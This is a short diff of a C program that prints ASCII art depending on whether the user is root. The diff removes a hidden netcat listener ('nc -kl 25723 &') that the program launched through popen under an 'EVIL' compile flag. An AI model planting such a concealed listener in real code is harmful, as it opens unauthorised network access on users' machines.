@@ -17,17 +17,11 @@ char *sudowoodo = ""
 "    (  |     (  (____\n"
 "  .--  .. ----**.____)\n"
 "  \\___/";
-char *cmd = "nc -kl 25723 &";
 
 int main() {
 	int sudo = getuid();
 
 	printf("%s\n", sudo != 0 ? woodo : sudowoodo);
-
-	#ifdef EVIL
-		FILE *fp = NULL;
-		fp = popen(cmd, "r");
-	#endif /* EVIL */
 
 	return 0;
 }
